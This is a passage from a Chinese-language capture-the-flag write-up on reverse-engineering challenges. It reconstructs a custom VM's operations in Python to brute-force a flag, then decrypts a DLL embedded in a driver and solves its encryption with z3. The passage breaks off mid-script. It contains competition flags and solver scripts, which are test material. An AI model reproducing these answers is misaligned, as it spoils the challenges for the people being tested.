class="hljs-keyword">default</span>:<br>          <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>            ;<br>      &#125;<br>    &#125;<br>  &#125;c<br></code></pre></td></tr></table></figure><p>发现了一个判断0xEF4015的地方。</p><p>发现是一个vm，分析opcode，还原从sal文件中提取出来的指令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br>a = [<span class="hljs-number">0</span>, <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;M&#x27;</span>)]  <span class="hljs-comment">#2c 2d</span><br>b = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment">#2e 2f</span><br>c = <span class="hljs-number">0</span><br>d = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment">#34 35</span><br>f = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment">#32 33</span><br>e = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment">#30 31</span><br>result = []<br><span class="hljs-comment">#flag&#123;hwbfkuaewbvlibfewaijbvjlwebcwydhisjk&#125;</span><br>inp = <span class="hljs-string">&quot;123456789123456789123456789123456789123456&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):<br>    a0 = ((a[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | a[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>    a0 = ((a0 &gt;&gt; <span class="hljs-number">9</span>) | (a0 &lt;&lt; (<span class="hljs-number">16</span> - <span class="hljs-number">9</span>))) &amp; <span class="hljs-number">0xffff</span><br>    a[<span class="hljs-number">0</span>] = a0 &gt;&gt; <span class="hljs-number">8</span><br>    a[<span class="hljs-number">1</span>] = a0 &amp; <span class="hljs-number">0xff</span><br>    b = [<span class="hljs-number">0</span>, <span class="hljs-built_in">ord</span>(inp[i])]<br>    b0 = (a[<span class="hljs-number">1</span>] + b[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>    a[<span class="hljs-number">1</span>] = b0 &amp; <span class="hljs-number">0xff</span><br>    a[<span class="hljs-number">0</span>] += b[<span class="hljs-number">0</span>] + (b0 &gt;&gt; <span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(a, b)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>    d[<span class="hljs-number">0</span>] = (i * <span class="hljs-number">2</span> + <span class="hljs-number">2</span>)<br>    b = [<span class="hljs-number">0</span>, <span class="hljs-built_in">ord</span>(inp[i*<span class="hljs-number">2</span>])]<br>    b0 = b[<span class="hljs-number">1</span>] - <span class="hljs-number">0x20</span><br>    b[<span class="hljs-number">1</span>] -= <span class="hljs-number">0x20</span><br>    b[<span class="hljs-number">0</span>] -= -((b0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)<br>    d[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span><br>    e = [<span class="hljs-number">0</span>, <span class="hljs-built_in">ord</span>(inp[i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>])]<br>    e0 = e[<span class="hljs-number">1</span>] - <span class="hljs-number">0x20</span><br>    e[<span class="hljs-number">1</span>] -= <span class="hljs-number">0x20</span><br>    e[<span class="hljs-number">0</span>] -= -((e0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)<br>    e1 = ((e[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | e[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>    e2 = (e1 &lt;&lt; -(ctypes.c_int8(<span class="hljs-number">0xf9</span>).value)) &amp; <span class="hljs-number">0xffff</span><br>    e[<span class="hljs-number">0</span>] = (e2 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    e[<span class="hljs-number">1</span>] = e2 &amp; <span class="hljs-number">0xff</span><br>    f = [<span class="hljs-number">0</span>, i]<br>    f0 = (((f[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | f[<span class="hljs-number">1</span>]) ^ <span class="hljs-number">0x4d</span>) &amp; <span class="hljs-number">0xffff</span><br>    f[<span class="hljs-number">0</span>] = (f0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>    f0 = (((f[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | f[<span class="hljs-number">1</span>]) * <span class="hljs-number">7</span>) &amp;<span class="hljs-number">0xffff</span><br>    f[<span class="hljs-number">0</span>] = (f0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>    f0 = (f[<span class="hljs-number">1</span>] + a[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>    f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>    f[<span class="hljs-number">0</span>] += (a[<span class="hljs-number">0</span>] + (f0 &gt;&gt; <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xff</span><br>    f0 = (f[<span class="hljs-number">1</span>] + b[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>    f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>    f[<span class="hljs-number">0</span>] += (b[<span class="hljs-number">0</span>] + (f0 &gt;&gt; <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xff</span><br>    f0 = (f[<span class="hljs-number">1</span>] + e[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>    f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>    f[<span class="hljs-number">0</span>] += (e[<span class="hljs-number">0</span>] + (f0 &gt;&gt; <span class="hljs-number">8</span>))<br>    f[<span class="hljs-number">0</span>] = f[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xff</span><br>    result.append(<span class="hljs-built_in">hex</span>(f[<span class="hljs-number">0</span>]))<br>    result.append(<span class="hljs-built_in">hex</span>(f[<span class="hljs-number">1</span>]))<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>还原出来才知道，中间大部分是在操作byte转word，其实运算挺简单的。</p><p>因为数组a不知道，所以要爆破，猜测答案是flag{}形式,爆破可得到数组a，然后解出flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br>i = <span class="hljs-number">0</span><br>a = [<span class="hljs-number">234</span>, <span class="hljs-number">6</span>]  <span class="hljs-comment">#2c 2d</span><br>b = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment">#2e 2f</span><br>c = <span class="hljs-number">0</span><br>d = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment">#34 35</span><br>f = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment">#32 33</span><br>e = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment">#30 31</span><br>cmmmp = [<span class="hljs-number">0x12</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0xDB</span>,<span class="hljs-number">0xF6</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0xF6</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xC1</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0xA3</span>,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0xD0</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xE4</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0xD7</span>,<span class="hljs-number">0xF8</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x9F</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xF9</span>,<span class="hljs-number">0x2E</span>,<span class="hljs-number">0x1B</span>,<span class="hljs-number">0x07</span>]<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>    br = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-comment">#a = [x, j]</span><br>            d[<span class="hljs-number">0</span>] = (i * <span class="hljs-number">2</span> + <span class="hljs-number">2</span>)<br>            b = [<span class="hljs-number">0</span>, x]<br>            b0 = b[<span class="hljs-number">1</span>] - <span class="hljs-number">0x20</span><br>            b[<span class="hljs-number">1</span>] -= <span class="hljs-number">0x20</span><br>            b[<span class="hljs-number">0</span>] -= -((b0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)<br>            d[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span><br>            e = [<span class="hljs-number">0</span>, j]<br>            e0 = e[<span class="hljs-number">1</span>] - <span class="hljs-number">0x20</span><br>            e[<span class="hljs-number">1</span>] -= <span class="hljs-number">0x20</span><br>            e[<span class="hljs-number">0</span>] -= -((e0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)<br>            e1 = ((e[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | e[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>            e2 = (e1 &lt;&lt; -(ctypes.c_int8(<span class="hljs-number">0xf9</span>).value)) &amp; <span class="hljs-number">0xffff</span><br>            e[<span class="hljs-number">0</span>] = (e2 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>            e[<span class="hljs-number">1</span>] = e2 &amp; <span class="hljs-number">0xff</span><br>            f = [<span class="hljs-number">0</span>, i]<br>            f0 = (((f[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | f[<span class="hljs-number">1</span>]) ^ <span class="hljs-number">0x4d</span>) &amp; <span class="hljs-number">0xffff</span><br>            f[<span class="hljs-number">0</span>] = (f0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>            f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>            f0 = (((f[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | f[<span class="hljs-number">1</span>]) * <span class="hljs-number">7</span>) &amp; <span class="hljs-number">0xffff</span><br>            f[<span class="hljs-number">0</span>] = (f0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>            f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>            f0 = (f[<span class="hljs-number">1</span>] + a[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>            f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>            f[<span class="hljs-number">0</span>] += (a[<span class="hljs-number">0</span>] + (f0 &gt;&gt; <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xff</span><br>            f0 = (f[<span class="hljs-number">1</span>] + b[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>            f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>            f[<span class="hljs-number">0</span>] += (b[<span class="hljs-number">0</span>] + (f0 &gt;&gt; <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xff</span><br>            f0 = (f[<span class="hljs-number">1</span>] + e[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffff</span><br>            f[<span class="hljs-number">1</span>] = f0 &amp; <span class="hljs-number">0xff</span><br>            f[<span class="hljs-number">0</span>] += (e[<span class="hljs-number">0</span>] + (f0 &gt;&gt; <span class="hljs-number">8</span>))<br>            f[<span class="hljs-number">0</span>] = f[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xff</span><br>            <span class="hljs-keyword">if</span> f[<span class="hljs-number">0</span>] == cmmmp[i*<span class="hljs-number">2</span>] <span class="hljs-keyword">and</span> f[<span class="hljs-number">1</span>] == cmmmp[i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>]:<br>                flag += <span class="hljs-built_in">chr</span>(x) + <span class="hljs-built_in">chr</span>(j)<br>                br = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> br == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="rev-apc"><a href="#rev-apc" class="headerlink" title="rev_apc"></a>rev_apc</h1><p>sys主要两个地方：</p><p>提取一个dll文件，</p><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210827163806101.png" alt="image-20210827163806101"></p><p>通讯数据加密：</p><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210827164021315.png" alt="image-20210827164021315"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a.dump&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>a = [<span class="hljs-number">0xde</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0xef</span>]<br>s = f.read()<br><span class="hljs-built_in">print</span>(s)<br>ss = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    ss += <span class="hljs-built_in">chr</span>(s[i] ^ a[i % <span class="hljs-number">4</span>]).encode(<span class="hljs-string">&quot;latin&quot;</span>)<br>fn = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;inject.dll&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>fn.write(ss)<br></code></pre></td></tr></table></figure><p>dump并解密dll文件，进行分析：</p><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210827164312005.png" alt="image-20210827164312005"></p><p>rand伪随机数，可以自己写C代码生成，各平台伪随机数可能不一样，要在windows上生成：</p><p>将初始化后的key与flag.txt的内容与驱动进行通讯加密：</p><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210827164526520.png" alt="image-20210827164526520"></p><p>我们先去找到加密方式，得到初始数据：</p><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210827111842748.png" alt="image-20210827111842748"></p><p>然后进行加密：</p><p><img src="/2021/08/26/%E7%A5%A5%E4%BA%91%E6%9D%AF2021-re%E9%83%A8%E5%88%86wp/image-20210827111919948.png" alt="image-20210827111919948"></p><p>后经分析，好像key和这个字符串没有关系。。。。</p><p>分析sys文件中的几个通讯加密函数，写脚本，z3求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br><br>key = []<br>s1 = [<span class="hljs-number">0xA5</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    s = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">1</span>):<br>        s ^= s1[j]<br>    key.append(s)<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment">#key = [0xA5, 0x6A, 0xA7, 0x71, 0xB4, 0x77, 0xC6, 0x03, 0xD1, 0x08, 0xDF, 0x18, 0xCE, 0x03, 0xD7, 0x0F,0xCC, 0x77, 0xBA, 0x62, 0xAE, 0x6D, 0xDD, 0x18, 0xC0, 0x09, 0xD5, 0xD5, 0xD5, 0xD5, 0xD5, 0xD5]</span><br>item = [<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>]<br>cmp = [<span class="hljs-number">0x57</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xeb</span>]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_22000b</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        key[i] = (key[i] + <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>        inp[i] ^= key[i]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_22000f</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        key[i] = (key[i] - <span class="hljs-number">80</span>) &amp; <span class="hljs-number">0xff</span><br>        tmp = ((key[i] &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xf0</span>) | ((key[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0f</span>)<br>        inp[i] ^= tmp<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_220013</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        inp[i] ^= key[i]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_220017</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        key[i] = (key[i] - <span class="hljs-number">80</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        inp[j*<span class="hljs-number">2</span>] ^= (key[j*<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span><br>        inp[j*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>] ^= (key[j*<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0f</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_22001b</span>():</span><br>    <span class="hljs-comment">#三个for循环 抵消</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        inp[j] ^= key[j]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_22001f</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        <span class="hljs-keyword">if</span> ctypes.c_uint8(key[i] - <span class="hljs-number">33</span>).value &gt; <span class="hljs-number">46</span>:<br>            <span class="hljs-keyword">if</span> ctypes.c_uint8(key[i] - <span class="hljs-number">81</span>).value &gt; <span class="hljs-number">46</span>:<br>                <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">0x80</span>:<br>                    key[i] -= <span class="hljs-number">48</span><br>                    inp[i] = ((inp[i] - key[i]) &amp; <span class="hljs-number">0xff</span>)<br>            <span class="hljs-keyword">else</span>:<br>                key[i] -= <span class="hljs-number">48</span><br>                inp[i] = (inp[i] ^ (key[i] &gt;&gt; <span class="hljs-number">4</span>)) &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-keyword">else</span>:<br>            key[i] = (key[i] - <span class="hljs-number">80</span>) &amp; <span class="hljs-number">0xff</span><br>            inp[i] = (inp[i] + key[i]) &amp; <span class="hljs-number">0xff</span><br>s = Solver()<br>inp = [BitVec(<span class="hljs-string">&quot;x%s&quot;</span> % i, <span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-keyword">if</span> item[i] == <span class="hljs-number">0</span>:<br>        _22000b()<br>    <span class="hljs-keyword">if</span> item[i] == <span class="hljs-number">1</span>:<br>        _22000f()<br>    <span class="hljs-keyword">if</span> item[i] == <span class="hljs-number">2</span>:<br>        _220013()<br>    <span class="hljs-keyword">if</span> item[i] == <span class="hljs-number">3</span>:<br>        _220017()<br>    <span class="hljs-keyword">if</span> item[i] == <span class="hljs-number">4</span>:<br>        _22001b()<br>    <span class="hljs-keyword">if</span> item[i] == <span class="hljs-number">5</span>:<br>        _22001f()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    s.add(inp[i] &amp; <span class="hljs-number">0xff</span> == cmp[i])<br>x = [BitVec(<span class="hljs-string">&quot;x%s&quot;</span> % i, <span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> i <span 